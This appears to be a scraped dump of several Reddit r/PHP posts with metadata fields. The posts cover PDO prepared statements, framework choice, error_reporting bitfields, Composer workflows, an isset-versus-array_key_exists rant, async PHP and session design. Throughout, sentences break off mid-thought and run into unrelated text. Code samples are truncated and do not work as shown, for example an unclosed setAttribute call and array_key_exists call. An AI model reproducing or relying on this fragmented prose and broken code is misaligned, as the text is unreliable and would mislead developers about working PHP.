    $pdo-&gt;setAttribute(\PDO::ATTR_ERRMODE

    // This creates a PDOStatement object (http://uk2.php.net/manual/en/class.pdostatement.php) which is
    // loaded with your query (it executes some SQL in the background to prepare your statement)
    // We also have a named parameter :myField that we can bind to a variable at a later point.
    // This is great because we *don't* have to escape it in any way to avoid SQL injection.
    $sth = $pdo-&gt;prepare(""
        SELECT *
        FROM myTable
        WHERE myField = :myField
    "");

    $myVariable = ""something"";
    
    // This executes the SQL query
    $sth-&gt;execute(array(
        ':myField' =&gt; $myVariable
    ));

    // We could now do several things with our statement.

    // We could find out the number of rows.
    echo $sth-&gt;rowCount();

    // We could iterate through the rows: (this is equivalent to mysql_fetch_array())
    while($row = $sth-&gt;fetch()) {
        var_dump($row);
    }

    // We could iterate through the rows without getting the numerical indices
    // I prefer this as it doesn't unnecessarily double the data you get.
    // I've added in \ before the constant so it will work under a namespace in PHP5.3. Remove this if
    // your PHP version is &lt; 5.3 as it will break.
    while($row = $sth-&gt;fetch(\PDO::FETCH_ASSOC)) {
        var_dump($row);
    }

    // Or we can grab all the results into one big array
    $rows = $sth-&gt;fetchAll(\PDO::FETCH_ASSOC);

* Use Wordpress
* Use an MVC framework that is easily extensible with a low learning curve (prefer if its based off CakePHP)
* Roll my own based off CakePHP
* Bear down and upgrade my old framework to meet modern standards...

I'm conflicted here because I want the system to have longevity, but the idea of working in that style of code turns my stomach, on the other hand it has a lot of stuff already done for me and I'd need only write plugins to add in the custom functionality. If I roll my own then I know I'll have full control which is nice, but will it be at the cost of development time? I have yet to find another CMS that I feel confident will allow me to do everything I want. I'd hate to get a month into development and find I have to hack things to meet my objectives. I also need a system that will be forgiving enough to allow me to easily add in new ideas as the site evolves.

**Pros**

* I think this is just about the easiest framework to get into
* teaches MVC very quickly
* great routing system that replaces controllers (but controllers can be used too)
* easy to use migrations (database creation/updating)
* easy to use out-of-the-box authentication and validation
* works via a PDO and can connect to numerous databases
* easy bundle use.
* mostly easy updating.

**Cons**

* it's new
* If you try to figure out why something's not working, even /r/laravel subscribes to help you out.
* while the community is seen as great and polite

The developer before me set up an environment where we have one Staging server in addition to our Production site.  Also before he left he helped me get my laptop set up with xampp/apache so I can work on it.  We also have TortoiseSVN for code repository.

But I am running into so many issues. I don't have an IDE anywhere so my PHP debugging is terribly slow

My boss is very not technical and hates planning ahead, I will create it on my laptop xampp and upload it to TortoiseSVN and use that to transfer it to Staging so she can take a look, she will ask me to change one small thing and I repeat the process probably 20 times.

This is a problem when we find a bug in the production site that is in the same area I am currently developing

One issue is that I have never gotten TortoiseSVN to work in any way like other similar code repositories in the past.  I can't seem to get it to roll back to previous versions and I just think it is not user-friendly enough for me to work with.  Do you have any other suggestions?  My boss will pay for one so we don't have to use this free one.

Also can you tell me how you do development? In which area do you actually edit and test the code as you work on it?  How and when do you transfer it around and how do you show your client/boss before it goes live?

How reasonably secure would the self manged VPS be if I did all that? What additional security measures do you

**MOST IMPORTANT CONCEPTS**

* Learn at least one framework (MVC) such as Zend, etc. Learning a couple isn't a bad choice so you can see how they stack up and choose which one you like more.
* Learn Object-Oriented Programming (OOP). Learn why it's useful and where you use it.
* Find a good way to manage your projects and edit your files. (Netbeans seems to be the most commonly used IDE for PHP)
* Always be working on something
* Learn to produce readable code that is commented well. Choose a standard of coding (either come up with your own or find one that suits you such as the Zend framework's standards) and stick with it.
* Get up to date on the latest best practices (Things such as using mysqli or a framework to deal with databases rather than just using mysql_query).
* Learn how to optimize your code for best performance. Things such as caching, smaller good practices like always closing your database connections when you're done with them.
* Learn how to use a debugger with PHP such as xdebug.
* Be social in the PHP community. Contribute to communities like r/php, and read blogs by professionals.


**SMALLER INDIVIDUAL CONCEPTS**

* Learn XML and JSON.
* Learn what Database Normalization means and when to us it.
* Have a knowledge of HTTP and headers
* Have a knowledge of MySQL storage engines and indexes.
* Understand character encoding.
* Learn what regexes are
* Learn what unit testing is.
* Learning the command line for your server is very helpful.",,t5_2qh38,1347656092.0,,,True,http://www.reddit.com/r/PHP/comments/zu1zn/what_does_it_take_to_be_hirable_in_the_world_of/

1340750368.0,vnk7x,Why -1 works with error_reporting().,SkepticalMartian,44,9,13,"A while back I got asked by a friend why -1 works to ""turn on everything"" with error_reporting()

[error_reporting](http://php.net/function.error_reporting) uses [bitfields](http://en.wikipedia.org/wiki/Bitfield) in order to determine which aspects of reported errors are turned on

Constants such as E_ALL, in php5.3 E_ALL equates to the number ""30719"".

If we convert this number to binary

    php &gt; var_dump(decbin(E_ALL));
    string(15) ""111011111111111""

You'll notice that not all the switches are turned on by default.  This is because E_STRICT is not included in E_ALL.  If we look at E_STRICT

    php &gt; var_dump(decbin(E_STRICT));
    string(12) ""100000000000""

If we line up the two numbers from the right

    111011111111111 // E_ALL
    000100000000000 // E_STRICT

So, which we can do with '|' (logical OR).  If you think of 1 and 0 as being similar to TRUE and FALSE, the comparison is analogous to what we do with the boolean operator '||', only on each individual bit.  since 1 OR 0 is 1, and 1 OR 1 is 1, all bits are turned on.  So, ""E_ALL | E_STRICT"" creates:

    php &gt; var_dump(decbin(E_ALL | E_STRICT));
    string(15) ""111111111111111""


Now

    php &gt; var_dump(decbin(-1));
    string(32) ""11111111111111111111111111111111""

Which turns on many more bits than PHP actually uses at present.  The benefit to this is that as php expands its error levels

EDIT:  

* Some people are suggesting that -1 is ""a hack"" - this simply is not true.  -1 in PHP will always equate to ""all bits on"" because php uses [Two's complement binary](http://en.wikipedia.org/wiki/Two's_complement).  PHP will not suddenly change how it works with numbers.

* It was also suggested that ~0 is a better approach, it achieves a result identical to -1.  Either method works, and what you choose to use will amount to personal preference.",,False,,t5_2qh38,,http://www.reddit.com/r/PHP/comments/vnk7x/why_1_works_with_error_reporting/

We are building or migrating a half-dozen or so projects to a new PHP framework based on the core Symfony components. When evaluating what we needed

This is our stack at the moment for our 'framework':

 * php 5.3.3
  * symfony/event-dispatcher
 * symfony/http-foundation
 * symfony/http-kernel
 * symfony/routing
 * respect/config
 * respect/relational
 * cartalyst/sentry
 * twig/twig
 * guzzle/guzzle
 * monolog/monolog

We also have our own libraries, etc. we throw all of these together but because we are working on more than one site at a time and have a number of projects we wanted to separate this part of the stack into a separate framework. Lets call it framework1 (we have our own internal name).

So we have one git repository that has all of those dependancies and a repo defined as company/framework. There is a src folder that is autoloaded which is where we put framework related code (ie. code that is common across all apps). The composer file looks something like this:

    {
      ""name"": ""company/framework""
      ""type"": ""library""
      ""description"": ""internal framework""
      ""require"": {
        ""php"": ""&gt;=5.3.3""
        ""symfony/event-dispatcher"": ""2.2.*""
        ""symfony/http-foundation"": ""2.2.*""
        ..
      }
      ""autoload"": {
          ""psr-0"": { 
            ""Framework"": ""src/""
          }
      }
      ""minimum-stability"": ""dev""
    }

Our 'apps'

    {
      ""name"": ""company/app1""
      ""description"": ""First app""
      ""require"": {
          ""php"": ""&gt;=5.3.3""
          ""company/framework"": ""dev-master""
      }
      ""minimum-stability"": ""dev""
      ""autoload"": {
          ""psr-0"": {
              ""App"": ""src/""
          }
      }
    }

We work on app code in 'src'. Here is the problem. There is no dedicated developer for 'framework' - each app developer (or teams on an app) make changes to both their respective apps and the frameworks. Lets say you want to add feature x - you go into the framework code and add a class and method calls

 * go into framework code
 * bump the version
 * git commit in the framework code
 * push to the server
 * go into app directory
 * run composer update

You can then see the new framework classes and method calls. But then you find an error or something else you need

One thing we tried is to add the framework as another PSR0 loader, but I figure I ask if there is already a best practice in place for this from someone else first.

The site has continued to grow over the years, PR, etc.) - I've decided I need to get a professional to take over the design and coding so they can add some really neat, clean features.

I figured I'd test my luck on Odesk, so I was confident that the contractors understood the project.  I finally selected one because they had built a great-looking large-scale reviews site before, and had great feedback on Odesk.

I was providing feedback nearly every day

They promised that the site would be completed in 4 months, and they assured me they would fix them.  Months later, they said they were done again.  After checking the site again, I noticed new bugs, and plenty of items still missing.

Finally we had a long talk, the 15th rolled around and the site was still incomplete.  I cut my losses and decided to move on.

________
TL;DR  - Built my site when I learned programming
---------

So now I'm back to square one - at least I have some more experience in selecting programmers, and users are always finding little bugs here and there.

So the job would be full-time for a few months

My questions are:

* How do I go about finding this right-hand man?

* How do I screen programmers? - What sort of questions should I be asking?

* What sort of info is appropriate to give prospective programmers?  Access to the database?  Sample scripts?

* What sort of payment structure is standard for work like this?

* I'd like to give them some type of test projects before committing them to the rebuild.  Any advice on giving test projects?  Seems like there would be a lot of work in setting them up on a test project.

Obviously I failed picking a programmer the first time

On the topic of Roll Your Own (*using libraries to keep it DRY and best practice) vs Frameworks such as Zend, etc... Many of the proponents of DIY say that they do it for ""small projects"", whilst most of the arguements for using one of the frameworks seems to be targeted towards larger projects. 

To me

Small client jobs requiring custom development work, blogs, forums, etc are *perfect* from preexisting frameworks - and these are exactly the projects they are targeted towards. The dev work on these kinds of sites can be rolled out in 24 hours or less by devs who are familiar enough to deploy using a framework. Presuming of course the dev is familiar with a framework.
When making a outsourcing decision for a project like this I'd almost always hire a developer familiar with frameworks (assuming all else is equal).

However, Reddit) have almost always resulted in myself (and my teams) developing a 'Framework' using preexisting libraries where appropriate but controlling everything from the ground up. When the teams do the intial project analysis and compare available frameworks against an in-house consensus the frameworks usually fall far behind.

That said, DRY, routing, caching, templating, yada yada yada) which inflates the 'positives' column of DIY. 

Both have their place

This may just come down to semantics - being that I see simple dev projects as client jobs such as galleries, but thats hardly 'development' now is it?

Hope none of this rubs anyone the wrong way!

I worked with a guy who decided to write his own framework from scratch for a project. He didn't tell anyone either. Anything he subsequently wrote would use that framework. Now this wouldn't have been a problem if he had included the entire team on this. Granted we probably would have used a community driven open source framework rather than some half baked crap he pumped out in a few weeks. After looking at the code no one wanted to use it. We had to completely abandon the use of some applications (based on this framework) and I am sure this company is still living with some of this guys mistakes.

I work alone, in my home. I sometimes collab with people over the net, but its not frequent; although when i do i tend to get more excited about a project when i think that people actually give a shit about whats going on.

Example syntax:

There are a myriad of methods that let you do things like inject parameters into the query string using key =&gt; value arrays in the format of $param =&gt; $value, protocol, swap one URI segment for another, etc., etc..

We have a bunch of devs here doing minimal site updates for our clients on these older platforms.  There is currently a system that was built by a previous incarnation of the dev team here (probably around 2002), then push files from the dev server to live.  It almost seems to use rsync, showing what files have changed, allowing the user to select files they want to push live, etc.  Also, there's config for how it should connect to the destination and other file/folder exemptions.  This was a great system in 2002 when 90% of the sites were static, or had generated-static files, requires all new servers to be set up with Perl

Now, public key authentication, zend framework and stuff like that, but it's going to be a sizable undertaking.  Also, if I were to write something like this based on Zend/rsync, would anyone be interested in a system like that?  ",,,,

1347979546.0,102x2i,I'll be doing a PHPUnit/unit testing presentation at my local Dallas PHP group next month. Anyone have any pointers?,jtreminio,32,3,41,"I'll be doing a presentation on unit testing code - not high-level theoretical stuff but actual ""this is code you can't test

While I know my testing fairly well (well enough do to a presentation on it) I'm not sure what all should be included in my presentation or how best to present the information so that my audience doesn't fall asleep (or god forbid leave midway).

I'm also thinking of basically writing an article on my site and then basing the presentation on a slimmed down version of the article. I hate how some presenters give slideshares of their stuff but it's missing all the meat - what they actually said.

Anyone with previous experience in this realm with some helpful pointers?",,t5_2qh38,1347979961.0,,,True,http://www.reddit.com/r/PHP/comments/102x2i/ill_be_doing_a_phpunitunit_testing_presentation/

The application is used for logistics planning, simply because a) new requests for features kept coming in and b) there was never any time allotted for a rewrite. To make things worse

* Over 1TB of data is retrieved from the database on a monthly basis.
* Millions of rows. Large tables.
* The most used page takes 30 seconds to fully load. The initial page loads in 2 seconds while the iframe containing the bulk of the data usually takes about 28 seconds to fully load (it loads bit by bit). Users are constantly refreshing this page as they need live up-to-date data.
* A previous employee decided to write his own custom templating engine for the page in question
* Our DBA reckons that the amount of IF statements inside IF statements is contributing to the slowness. I'm not sure I fully agree with that. From what I've read
* We all agree that the sheer amount of data we're attempting to render on the page is one of the biggest issues (a lot of data with tables inside tables). Unavoidable to a certain degree. Profilers show this to be one of the biggest issues
* Multiple JS includes that I'm afraid to touch, I'd be forced to leave the other files behind, simply because some obscure page is also using them. This means duplicate code. Also, the 20+ HTTP requests in question aren't actually that big of an issue, simply because our DBA / server guy has some caching going on, which means that the majority of the files are served together side-by-side within 35ms. 
* Today
* Profiled the main query on the page and found out that it wasn't using one of the 10 indexes that existed. It was using filesort. Couldn't seem to force MySQL to use the index we wanted? As a result of my prodding
* Before I made the sub data fix
* Page in question consists of 10K+ lines of code.

Other times I hang about on stackoverflow.com looking to see if I can solve people's problems.  The motivation for that disappears though because someone else can nearly always submit the correct (and probably better than mine) answer while I'm working it out.

I've been tempted to learn a framework a few times but that stops when I realize that for the small-scale things I do it would actually be counter-productive to implement stuff in a framework.  I would end up with something more complex than a non-framework built equivalent and it would be harder for me to re-understand what my code is doing if I were to come back to it at some future date to make a change.

I feel like my projects could benefit from OOP, and a 'getSection' member function ('section' in my site refers to a sub gallery, like 'miscelaneous' or 'landscape') and then it occurs to me that this wouldn't improve much on the way it works now.

In short - I would be trying to re-invent the wheel if I were to try to re-write my website in OOP

1293783856.0,eu38n,Jeffm: isset isn't a faster version of array_key_exists (and other lessons),incognito9876,60,31,31,"I used to be a major contributor to a little known PHP framework. Now, so development continued.

Part of the framework included a very simple ORM, insert records into a database from simple PHP arrays, like so:

    $mymodel-&gt;insert(array(
        'first' =&gt; 'John'
        'last' =&gt; 'Doe'
        'dob' =&gt; '1981-01-29'
    ));

Pretty simple stuff. If a field is missing from the array

Deep down in the framework I had some code:

    for ($this-&gt;fields as $field)
    {
        if (!array_key_exists($field-&gt;name
        {
            $row[$field-&gt;name] = $field-&gt;default;
        }
    }

*(this is an extreme simplification

Anyways, one of the guys that joined the team about a month before I left committed this:

&gt; isset is faster than array\_key\_exists. Replacing a ton of slow code from incognito9876.

*(this was one commit among a few others that call me out by name)*

The change set consisted of over 200 changes

In fairness, by the 3ms per page load that this change amounts to, but well thought out, tested and measured improvements, preferably by using a profiler, rather than find-and-replace based on some queer notion that using isset (when what you really need to know is whether or not an array key exists or not) will fix all of your performance problems.

So now that bit of ORM code reads like this:

    for ($this-&gt;fields as $field)
    {
        if (!isset($row[$field-&gt;name]))
        {
            $row[$field-&gt;name] = $field-&gt;default;
        }
    }

So...when we specify NULL

Let's run the test suite.

352 tests fail out of over 2000 for a variety of reasons, and checks that it was inserted correctly.

**To jeffm:**

I hope you're reading this Jeff.

Not only are you an asshole, or, God forbid, maintain-- the test suite. Not a single commit was made to the tests directory in like two and a half fucking years, and the last commit has my name on it.

I know my code was fucking slow

The state of event-driven programming in PHP sucks. Existing libraries require non-blocking semantics for computational concurrency. These libraries advertise non-blocking IO and event-driven concurrency. They make grandiose claims about ""async"" but don't tell you that for any of it to be useful you need
asynchronous and non-blocking language features to go along with it.

Some non-blocking libs endeavor to expose non-blocking APIs for popular use cases (MySQL, ""knock yourself out,"" but without a way to multiprocess these event loops have extremely limited value for anything but CLI scripts.

Node.js became popular and we immediately got the standard wave of PHP knockoffs. But these libraries didn't realize that PHP simply isn't javascript; it doesn't have the asynchronous capability baked into the language. This simple fact demonstrates a severe lack of creativity on the part of the devs who created the current set of event-driven PHP tools. What's more
good asynchronous solution for PHP **MUST** allow access to the vast toolkit available to synchronous PHP code.

Now

The emerging pthreads extension is another option, there are many who argue that threading is an untenable solution in the first place (myself included).

So let me suggest an alternative ...

[**AMP: Asynchronous Multiprocessing in PHP**](https://github.com/rdlowrey/Amp)

AMP makes concurrency and distributed processing a reality for PHP coders of any skill level on any operating system and without the need for any extensions. It lets you transparently dispatch RPC-style function calls to remote job servers and/or worker process pools with the same API and eliminates the need for non-blocking APIs because it allows you to write synchronous code that is then invoked and returned asynchronously.

A simple demonstration:

    $dispatcher-&gt;call($onResultCallback
    $dispatcher-&gt;call($onResultCallback
    $dispatcher-&gt;call($onResultCallback

With AMP we can execute this code in **one second** instead of the **three seconds** that would be required to make three synchronous sleep calls. What's more

Benchmarks are pointless and only applicable to a specific moment in time on specific hardware. So I'll just mention this in passing: currently Amp is able to dispatch and return ~15

So far as I know there are 3 approaches to “fake the state”. There may be others and please let me know. I do not profess to know everything about php or building scalable web apps. But scalability and reduction of resources is the priority here.

Approach #1: Use cookies (for example $_COOKIE[‘user_id’]

Approach #2: Use cookies or session to hold an encrypted ‘user_id’ and then load the rest from the database on every request.

Approach #3: Use session variables (or better yet) a single session variable object as a “user container” (could also be an array of course if you are into that) for example $_SESSION[‘user’]-&gt;user_id, etc.

My Analysis of these approaches:

Aproach #1 using big encrypted cookies worries me for a few reasons. I personally see cookies as a liability. No matter how well they are serialized or encrypted

Approach #2 would be to hold just the “user id” in a session or encrypted cookie and load the user object from the database on every request. This would keep memory usage down but would necessitate hitting the database on every request to rebuild the “user object”. This is the approach I have seen the most often. Often one must save state to database as well at the end of every request as well thus adding more database calls.

Approach #3 with sessions is how I like to do it. It prevents me from hitting the database on every request. It prevents me from storing anything besides the session id on the client’s computer. The penalty of course is server memory usage, it’s still only 2 megs of session data being held. Hardly enough to get worried about. IMO this allows for quick and inexpensive “retrieval” and “saving” of data. Of course you still need to save the session to the database once in a while... but certainly not every request (of course this depends on the application).

The trouble is I don’t see this approach very often in other frameworks

PHP, you're committing a programming sin. You should never write code to simply bail out of execution on an Exception.

Instead, a PDOException, you should only catch it if you can recover from it. Recovering from it can be anything from re-trying your connection, to simply letting your user know a connection could not be established, and letting the user figure it out.

For awhile now I've been working on this caching library as part of a larger project

* Hierarchal Storage - items are stored using 'keys'

* Interchangeable Storage Handlers - Stash uses different storage engines for the cache pool. Existing handlers include filesystem, and memcache (with support for xcache coming soon).

* Flexible Storage - Stash stores every PHP type but resources (since storing database connections or file pointers isn't easy). It uses the least intensive encoding possible

* Staggered Handlers - Multiple handlers can have stacked on top of one another using a special handler. This lets you mix and match any handlers
   
   
On top of that there are a lot of smaller features that I'm really happy about. Stash distributes cache misses
   
   
I wanted to share this with you guys for two reasons, debian squeeze- all php5.3). If anyone using a different system runs into any issues I would *really* appreciate it if they could run the test suite to help me debug it.

My hypothesis is that if I could, multiple times so I can capture all of the various states the site generates for that URL, and build a map of all the functions it calls, I could extract all of those functions from all of those files and put them in a single PHP file, and this would be faster and use less memory to start up and run than having the whole framework and all the other overhead, and it would let us load-balance and optimize at the URL level instead of averaging across the whole site.

I've been using ajax in my applications and from my experience, sometimes we need to work with JSON data. For example, ""response.login_status"" could easily be handled in client side. We can tell client to do different things depending on response. This approach requires more coding on client side but it ""feels like"" it is a better approach, since I have advantages like handling responde differently on client side/have additional clients like desktop-mobile etc and it can be a slight advantage when working with front-end developers.  Nowadays, I don't respond HTML except for GET requests (e.g loading requested page without layout), rest is all JSON.

However

Can we do such things on client side

     response('post'
          //Handles JSON returned after POSTing to account/login URI

          if(response.status === 'error')
               Modal.open('Could not login: ' + response.error_message');
          else
               Remove Register and Login links
               Add ['My Account'
               Get user's online friendlist (This is also going to be JSON
               Get user's notifications
               Other stuff
     });

     response('get'
     {
         $('#content').html(response); //basic get requests with ajax
     });

This idea looks slightly better than my current client coding since we can define routes to handle things so maintaining JS will be easier.

Basically, more flexible approach on data transfer between server and client. HTML? JSON? A JS framework? Something better which I don't know?

**Question 2:** 
I tend to gather whatever is necessary to generate a page and respond them all in once. Like;

    View::make('usercp.my_profile')
         -&gt;with('user'
         -&gt;with('friends'
         -&gt;with('notifications'

So page generates.

However, then they put loading icons to some divs, make request to PHP and pull information afterwards, append appropriate areas. It's like, you login, see your profile page, your ""friends div"" has a loading icon, ""ajax/get_notifications.php"" update appropriate divs.

What kind of approach is that? It sounds like bad practice to me since there will be 3 requests instead of 1 and it will eventually lead to performance related issues. However
